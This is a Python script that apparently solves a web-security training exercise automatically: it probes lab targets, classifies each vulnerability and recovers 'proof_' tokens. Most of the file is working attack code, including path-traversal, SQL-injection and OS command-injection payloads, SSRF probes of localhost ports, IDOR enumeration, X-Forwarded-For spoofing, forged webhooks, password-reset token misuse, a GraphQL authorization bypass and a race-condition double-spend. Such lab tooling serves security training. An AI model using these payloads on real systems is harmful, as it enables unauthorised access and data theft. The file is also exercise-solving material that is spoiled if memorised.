#!/usr/bin/env python3
"""Mastery classifier for day-25: probe each target, classify, and recover proof.

Ports recovery_lib.py logic (Target client, rec_* recoverers) into an authored
solver for this job. Classification is per-target from live evidence only.
"""
import json
import re
import sys
import time
import urllib.parse
import urllib.request
import urllib.error
import http.cookiejar
from html.parser import HTMLParser

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
TIMEOUT = 30
DELAY = 0.8
PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")


class Links(HTMLParser):
    def __init__(self):
        super().__init__()
        self.hrefs = []

    def handle_starttag(self, tag, attrs):
        if tag == "a":
            for k, v in attrs:
                if k == "href" and v:
                    self.hrefs.append(v)


class Target:
    def __init__(self, base_url, evidence_dir=None):
        self.base = base_url.rstrip("/")
        self.evidence_dir = evidence_dir
        self._requests = 0
        self.cookiejar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cookiejar))

    def _save(self, name, status, body):
        if not self.evidence_dir or not name:
            return
        import os
        os.makedirs(self.evidence_dir, exist_ok=True)
        with open(f"{self.evidence_dir}/{name}.meta.json", "w") as f:
            json.dump({"status": status}, f)
        with open(f"{self.evidence_dir}/{name}.body", "w") as f:
            f.write(body)

    def request(self, path_or_url, method="GET", data=None, headers=None, save=None):
        if self._requests:
            time.sleep(DELAY)
        self._requests += 1
        url = path_or_url if path_or_url.startswith("http") else self.base + path_or_url
        if not url.startswith(self.base):
            raise ValueError(f"refusing out-of-scope URL: {url}")
        body = json.dumps(data).encode() if data is not None else None
        hdrs = {"User-Agent": UA}
        if data is not None:
            hdrs["Content-Type"] = "application/json"
        hdrs.update(headers or {})
        req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
        try:
            with self.opener.open(req, timeout=TIMEOUT) as resp:
                status, text = resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as err:
            status, text = err.code, err.read().decode("utf-8", "replace")
        self._save(save, status, text)
        return status, text

    def get(self, path, headers=None, save=None):
        return self.request(path, "GET", headers=headers, save=save)

    def get_json(self, path, headers=None, save=None):
        status, body = self.get(path, headers=headers, save=save)
        try:
            return status, (json.loads(body) if status == 200 else None)
        except ValueError:
            return status, None

    def post_json(self, path, payload, headers=None, save=None):
        status, body = self.request(path, "POST", data=payload, headers=headers, save=save)
        try:
            return status, (json.loads(body) if body else None)
        except ValueError:
            return status, None


def rec_backup(t):
    status, robots = t.get("/robots.txt", save="robots")
    if status != 200:
        return None
    for d in re.findall(r"(?mi)^\s*Disallow:\s*(\S+)", robots):
        d = "/" + d.strip("/") + "/"
        status, index = t.get(d, save="index" + d.replace("/", "_"))
        if status != 200:
            continue
        parser = Links()
        parser.feed(index)
        members = [h for h in parser.hrefs if h.rstrip("/").split("/")[-1]]
        members.sort(key=lambda h: 0 if re.search(
            r"\.(bak|old|orig|save|swp|zip|tar|gz|sql|json|txt|env)(\.|$)", h, re.I) else 1)
        for href in members:
            path = href if href.startswith("/") else d + href
            status, body = t.get(path, save="file_" + path.strip("/").replace("/", "_"))
            if status != 200:
                continue
            m = PROOF_RE.search(body)
            if m:
                return m.group(0)
    return None


def rec_idor(t, html):
    feed = next(iter(re.findall(r'href="(/api/[^"]+)"', html)), None)
    case_links = re.findall(r'href="(/[a-z]+/\d+)"', html)
    if not feed or not case_links:
        return None
    my_ids = {int(link.rsplit("/", 1)[1]) for link in case_links}
    status, case_page = t.get(case_links[0], save="mycase")
    api_template = None
    inline = re.search(r'fetch\(["\'](/api/[^"\']*?)(\d+)([^"\']*)["\']', case_page)
    if inline:
        api_template = (inline.group(1), inline.group(3))
    status, feed_body = t.get(feed, save="feed")
    try:
        feed_json = json.loads(feed_body)
    except ValueError:
        return None
    me = feed_json.get("current_user")
    foreign_ids = []
    for event in feed_json.get("events", []):
        case_id = event.get("case_id") or event.get("id")
        if case_id is None:
            continue
        if (event.get("owner") and event.get("owner") != me) or \
                event.get("visibility") == "reference_only" or case_id not in my_ids:
            foreign_ids.append(case_id)

    def object_urls(case_id):
        if api_template:
            yield f"{api_template[0]}{case_id}{api_template[1]}"
        kind = case_links[0].rsplit("/", 2)[-2]
        yield f"/api/{kind}/{case_id}"

    for case_id in dict.fromkeys(foreign_ids):
        for url in dict.fromkeys(object_urls(case_id)):
            status, body = t.get(url, save=f"obj_{case_id}")
            if status == 200:
                m = PROOF_RE.search(body)
                if m:
                    return m.group(0)
                break
    return None


def rec_lfi(t, html, prompt=""):
    link = re.search(r'href="([^"]*\.php)\?(\w+)=', html)
    endpoint, param = (link.group(1), link.group(2)) if link else ("/reader.php", "doc")
    objective = re.search(r"mounted at (/\S+)", prompt)
    target_path = objective.group(1).rstrip(".") if objective else "/run/huntress/objective.txt"
    rel = target_path.lstrip("/")
    for depth in range(1, 9):
        payload = "../" * depth + rel
        status, body = t.get(f"{endpoint}?{urllib.parse.urlencode({param: payload})}", save=f"lfi_d{depth}")
        m = PROOF_RE.search(body)
        if m:
            return m.group(0)
    status, body = t.get(f"{endpoint}?{urllib.parse.urlencode({param: target_path})}", save="lfi_abs")
    m = PROOF_RE.search(body)
    return m.group(0) if m else None


def rec_sqli_group_close(t, html):
    action_match = re.search(r"<form[^>]*action=['\"]([^'\"]+)['\"]", html)
    name_match = re.search(r"<input[^>]*name=['\"]([^'\"]+)['\"]", html)
    action = action_match.group(1) if action_match else "/search"
    name = name_match.group(1) if name_match else "q"
    for i, payload in enumerate(("') OR ('1'='1", "%' OR '1'='1", "') OR ('1'='1'-- -", "' OR '1'='1")):
        status, body = t.get(f"{action}?{urllib.parse.urlencode({name: payload})}", save=f"sqli_{i}")
        m = PROOF_RE.search(body)
        if m:
            return m.group(0)
    return None


def rec_missing_log_event(t, clues):
    """This family's own class: protected action logged as benign event only."""
    feature, secondary = clues.get("feature_route"), clues.get("secondary_route")
    if not feature or not secondary:
        return None
    status, before = t.get_json(secondary, save="status_before")
    fields = (before or {}).get("report", {}).get("fields", [])
    if len(fields) < 3:
        return None
    id_field, missing_field, observed_field = fields[:3]
    status, export = t.post_json(feature, {}, save="export")
    if status != 200 or not export:
        return None
    export_id = export.get("export_id")
    operation = export.get("operation")
    if not export_id or not operation:
        return None
    status, after = t.get_json(secondary, save="status_after")
    observed = None
    for event in (after or {}).get("events", []):
        if event.get(id_field) == export_id or event.get("export_id") == export_id:
            observed = event.get("event")
    if not observed:
        return None
    report = {id_field: export_id, missing_field: operation, observed_field: observed}
    status, result = t.post_json(secondary, report, save="report")
    text = json.dumps(result) if isinstance(result, (dict, list)) else str(result or "")
    m = PROOF_RE.search(text)
    return m.group(0) if m else None


def rec_command_injection(t, clues):
    feature = clues.get("feature_route")
    param = clues.get("input_parameter", "path")
    example = clues.get("example_path", "/app/static")
    if not feature:
        return None
    suffix = "; cat $OBJECTIVE_PATH 2>/dev/null || cat /run/huntress/objective.txt"
    status, body = t.get(feature + "?" + urllib.parse.urlencode({param: example + suffix}), save="cmdi")
    m = PROOF_RE.search(body)
    return m.group(0) if m else None


def rec_reset_account_confusion(t, clues):
    feature, secondary = clues.get("feature_route"), clues.get("secondary_route")
    guide_route = clues.get("recovery_guide_route")
    if not feature or not secondary or not guide_route:
        return None
    status, guide = t.get_json(guide_route, save="recovery_guide")
    if status != 200 or not guide:
        return None
    account_param = guide.get("account_parameter", "account_id")
    token_param = guide.get("token_parameter", "token")
    accounts = guide.get("accounts", [])
    self_ids = [a["id"] for a in accounts if a.get("self_service")]
    other_ids = [a["id"] for a in accounts if not a.get("self_service")]
    for self_id in self_ids:
        status, issued = t.get_json(f"{feature}?{urllib.parse.urlencode({account_param: self_id})}", save=f"request_{self_id}")
        token = (issued or {}).get("token")
        if status != 200 or not token:
            continue
        for other_id in other_ids:
            q = urllib.parse.urlencode({token_param: token, account_param: other_id})
            status, redeemed = t.get_json(f"{secondary}?{q}", save=f"redeem_{self_id}_as_{other_id}")
            if status == 200 and isinstance(redeemed, dict):
                m = PROOF_RE.search(json.dumps(redeemed))
                if m:
                    return m.group(0)
    return None


def rec_graphql_field_bypass(t, clues):
    feature = clues.get("feature_route")
    protected_id = clues.get("protected_reference")
    if not feature or protected_id is None:
        return None
    status, obj = t.post_json(
        feature, {"query": 'query { case(id: "%s") { id title note } }' % protected_id}, save="graphql_case")
    note = ((obj or {}).get("data") or {}).get("case", {}).get("note", "")
    m = PROOF_RE.search(note)
    return m.group(0) if m else None


def rec_forged_webhook_event(t, clues):
    feature = clues.get("feature_route")
    event_type = clues.get("event_type")
    owner_scope = clues.get("owner_scope")
    if not feature or not event_type or not owner_scope:
        return None
    bodies = (
        {"event": event_type, "owner": owner_scope},
        {"event": event_type, "type": event_type, "event_type": event_type,
         "owner_scope": owner_scope, "scope": owner_scope, "owner": owner_scope},
    )
    for i, body in enumerate(bodies):
        status, resp = t.post_json(feature, body, save=f"forge_{i}")
        text = resp if isinstance(resp, str) else json.dumps(resp)
        m = PROOF_RE.search(text)
        if m:
            return m.group(0)
    return None


def rec_proxy_trust_bypass(t, clues):
    feature = clues.get("feature_route")
    if not feature or clues.get("deployment") != "trusted_reverse_proxy":
        return None
    status, body = t.get_json(feature, headers={"X-Forwarded-For": "127.0.0.1"}, save="proxy_trust")
    if status == 200 and isinstance(body, dict):
        m = PROOF_RE.search(json.dumps(body))
        if m:
            return m.group(0)
    return None


def rec_ssrf(t, clues):
    feature, secondary = clues.get("feature_route"), clues.get("secondary_route")
    if not feature or not secondary:
        return None
    for port in (8080, 80, 5000, 5001, 8081, 3000, 8000, 4000, 8888, 443):
        internal_url = f"http://127.0.0.1:{port}{secondary}"
        status, body = t.get_json(feature + "?" + urllib.parse.urlencode({"url": internal_url}), save=f"ssrf_port_{port}")
        if status == 200 and isinstance(body, dict):
            m = PROOF_RE.search(json.dumps(body))
            if m:
                return m.group(0)
    return None


def rec_double_spend(t, clues, racers=12):
    feature, secondary = clues.get("feature_route"), clues.get("secondary_route")
    if not feature or not secondary:
        return None
    from concurrent.futures import ThreadPoolExecutor

    def fire(_i):
        req = urllib.request.Request(
            t.base + feature, data=b"{}",
            headers={"User-Agent": UA, "Content-Type": "application/json"}, method="POST")
        try:
            with t.opener.open(req, timeout=TIMEOUT) as resp:
                return resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as err:
            return err.read().decode("utf-8", "replace")

    with ThreadPoolExecutor(max_workers=racers) as ex:
        list(ex.map(fire, range(racers)))
    status, body = t.get(secondary, save="audit")
    m = PROOF_RE.search(body)
    return m.group(0) if m else None


def classify_and_recover(t, prompt="", evidence=None):
    evidence = evidence if evidence is not None else {}
    status, html = t.get("/", save="root")
    evidence["root_status"] = status
    if status != 200:
        evidence["classification"] = "root request failed"
        return None

    clues_status, clues = t.get_json("/api/clues", save="clues")
    if clues_status == 200 and clues:
        evidence["clues"] = clues
        # day-25 family: missing audit log event
        if clues.get("feature_route") and clues.get("secondary_route") and clues.get("current_role") and \
                "inventory_route" not in clues and "input_parameter" not in clues and \
                "recovery_guide_route" not in clues and "deployment" not in clues and \
                "event_type" not in clues and "protected_reference" not in clues and \
                "moderator_data_route" not in clues and "render_route" not in clues and \
                "session_hint" not in clues and "callback_nonce" not in clues and \
                "preferences_route" not in clues:
            # bare shape: could be day-25 missing-log, SSRF, or double-spend
            # day-25 status route has report.fields - probe it first (read-only)
            status, probe = t.get_json(clues["secondary_route"], save="probe_secondary")
            if status == 200 and isinstance(probe, dict) and probe.get("report", {}).get("fields"):
                evidence["classification"] = "missing audit log event"
                proof = rec_missing_log_event(t, clues)
                if proof:
                    return proof
            # fall through to double-spend then SSRF on same shape
            evidence["classification"] = "credit double-spend (race)"
            proof = rec_double_spend(t, clues)
            if proof:
                return proof
            evidence["classification"] = "SSRF (fetch proxy to internal-only route)"
            proof = rec_ssrf(t, clues)
            if proof:
                return proof
        if clues.get("session_hint") and clues.get("feature_route") and clues.get("secondary_route"):
            evidence["classification"] = "session fixation"
            # not expected on day-25 but kept for completeness
            return None
        if clues.get("callback_nonce") and clues.get("feature_route") and clues.get("secondary_route"):
            evidence["classification"] = "reflected XSS + isolated browser callback"
            return None
        if clues.get("feature_route") and clues.get("input_parameter") and "example_path" in clues:
            evidence["classification"] = "OS command injection"
            proof = rec_command_injection(t, clues)
            if proof:
                return proof
        if clues.get("recovery_guide_route") and clues.get("feature_route") and clues.get("secondary_route"):
            evidence["classification"] = "password-reset token / account-id confusion"
            proof = rec_reset_account_confusion(t, clues)
            if proof:
                return proof
        if clues.get("feature_route") and clues.get("deployment") == "trusted_reverse_proxy":
            evidence["classification"] = "trusted-reverse-proxy header spoofing"
            proof = rec_proxy_trust_bypass(t, clues)
            if proof:
                return proof
        if clues.get("feature_route") and clues.get("inventory_route") and "protected_reference" in clues:
            evidence["classification"] = "field/action authorization bypass"
            # not ported here; fall through if needed
            return None
        if clues.get("feature_route") and clues.get("protected_reference") is not None \
                and "inventory_route" not in clues and "secondary_route" not in clues:
            evidence["classification"] = "GraphQL field-level authorization bypass"
            proof = rec_graphql_field_bypass(t, clues)
            if proof:
                return proof
        if clues.get("feature_route") and clues.get("event_type") and clues.get("owner_scope"):
            evidence["classification"] = "forged/unsigned webhook event trust"
            proof = rec_forged_webhook_event(t, clues)
            if proof:
                return proof

    if re.search(r'href="[^"]*\.php\?\w+=', html):
        evidence["classification"] = "LFI (path traversal viewer)"
        proof = rec_lfi(t, html, prompt)
        if proof:
            return proof

    if re.search(r'href="(/api/[^"]+)"', html) and re.findall(r'href="(/[a-z]+/\d+)"', html):
        evidence["classification"] = "IDOR"
        proof = rec_idor(t, html)
        if proof:
            return proof

    if re.search(r'<form[^>]*action=[\'"][^\'"]*(search|lookup|explore)', html, re.I):
        evidence["classification"] = "SQL injection (group-closing boolean)"
        proof = rec_sqli_group_close(t, html)
        if proof:
            return proof

    if re.search(r"crawler polic|robots", html, re.I):
        evidence["classification"] = "backup exposure"
        proof = rec_backup(t)
        if proof:
            return proof

    if "<form" in html:
        proof = rec_sqli_group_close(t, html)
        if proof:
            evidence["classification"] = "SQL injection (group-closing boolean, fallback)"
            return proof
    evidence.setdefault("classification", "unclassified; tried backup exposure as a last resort")
    return rec_backup(t)


def main():
    import os
    start = json.load(open("mastery/start.json"))
    targets = {t["id"]: t["url"] for t in start["targets"]}
    answers = {}
    for q in start["questions"]:
        qid = q["id"]
        tid = q["artifact"]
        url = targets[tid]
        ev_dir = f"mastery/evidence/{tid.replace(' ', '_')}"
        os.makedirs(ev_dir, exist_ok=True)
        t = Target(url, evidence_dir=ev_dir)
        evidence = {}
        prompt = q.get("question", "")
        proof = classify_and_recover(t, prompt=prompt, evidence=evidence)
        print(f"{qid} ({tid}): {evidence.get('classification')} -> {proof}")
        with open(f"{ev_dir}/classification.json", "w") as f:
            json.dump(evidence, f, indent=2)
        if proof:
            answers[qid] = proof
    with open("mastery/answers.json", "w") as f:
        json.dump(answers, f, indent=2)
    print(f"wrote mastery/answers.json with {len(answers)} answers")


if __name__ == "__main__":
    main()
